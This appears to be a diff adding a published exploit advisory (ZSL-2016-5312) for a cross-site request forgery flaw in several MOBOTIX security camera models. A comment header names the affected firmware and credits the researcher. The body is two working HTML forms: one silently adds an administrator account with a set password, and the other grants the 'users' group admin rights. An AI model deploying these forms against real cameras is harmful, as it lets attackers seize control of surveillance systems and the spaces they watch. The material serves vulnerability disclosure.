@@ -1,0 +1,96 @@
+<!--
+
+
+MOBOTIX Video Security Cameras CSRF Add Admin Exploit
+
+
+Vendor: MOBOTIX AG
+Product web page: https://www.mobotix.com
+Affected version: [Model]: D22M-Secure, [HW]: T2r1.1.AA, 520 MHz, 128 MByte RAM, [SW]: MX-V3.5.2.23.r3
+                  [Model]: Q24M-Secure, [HW]: T2r3.1, 806 MHz, [SW]: MX-V4.1.10.28
+                  [Model]: D14D-Secure, [HW]: T2r4.2b, 806 MHz, 256 MByte RAM, [SW]: MX-V4.1.4.70
+                  [Model]: M15D-Secure, [HW]: T3r4.4, 806 MHz, [SW]: MX-V4.3.4.50
+
+Summary: MOBOTIX is a German System Manufacturer of Professional Video
+Management (VMS) and Smart IP Cameras. These cameras support all standard
+features of MOBOTIX IP cameras like automatic object detection, messaging
+via network and onboard or network recording. The dual lens thermal system
+supports additionally a second optical video sensor with 6-megapixel resolution.
+
+Desc: The application interface allows users to perform certain actions via
+HTTP requests without performing any validity checks to verify the requests.
+This can be exploited to perform certain actions with administrative privileges
+if a logged-in user visits a malicious web site.
+
+Tested on: Linux 2.6.37.6+
+           thttpd/2.19-MX
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2016-5312
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2016-5312.php
+
+
+25.02.2016
+
+-->
+
+
+
+Add admin user Testingus:
+-------------------------
+
+<html>
+  <body>
+    <form action="http://10.0.0.17/admin/access" method="POST">
+      <input type="hidden" name="user&#95;name&#95;0" value="admin" />
+      <input type="hidden" name="user&#95;group&#95;0" value="admins" />
+      <input type="hidden" name="user&#95;passwd&#95;a&#95;0" value="&#42;&#42;&#42;" />
+      <input type="hidden" name="user&#95;passwd&#95;b&#95;0" value="&#42;&#42;&#42;" />
+      <input type="hidden" name="user&#95;name&#95;2" value="Testingus" />
+      <input type="hidden" name="user&#95;group&#95;1" value="admins" />
+      <input type="hidden" name="user&#95;passwd&#95;a&#95;2" value="l33tp4ss" />
+      <input type="hidden" name="user&#95;passwd&#95;b&#95;2" value="l33tp4ss" />
+      <input type="hidden" name="sv&#95;passwd&#95;a" value="" />
+      <input type="hidden" name="sv&#95;passwd&#95;b" value="" />
+      <input type="hidden" name="super&#95;pin&#95;1" value="" />
+      <input type="hidden" name="super&#95;pin&#95;2" value="" />
+      <input type="hidden" name="save&#95;config" value="Set" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
+
+
+Add group 'users' to admin area:
+--------------------------------
+
+<html>
+  <body>
+    <form action="http://10.0.0.17/admin/acl" method="POST">
+      <input type="hidden" name="group&#95;allow&#95;guest&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;live&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;player&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;multiview&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;pda&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;mxcc&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;info&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;imagelink&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;api&#95;global" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;image&#95;setup&#95;0" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;event&#95;setup&#95;0" value="on" />
+      <input type="hidden" name="group&#95;name&#95;1" value="guests" />
+      <input type="hidden" name="group&#95;name&#95;2" value="users" />
+      <input type="hidden" name="group&#95;allow&#95;admin&#95;2" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;image&#95;setup&#95;2" value="on" />
+      <input type="hidden" name="group&#95;allow&#95;event&#95;setup&#95;2" value="on" />
+      <input type="hidden" name="new&#95;group" value="" />
+      <input type="hidden" name="save&#95;config" value="Set" />
+      <input type="hidden" name="more&#95;or&#95;less" value="less" />
+      <input type="submit" value="Submit" />
+    </form>
+  </body>
+</html>
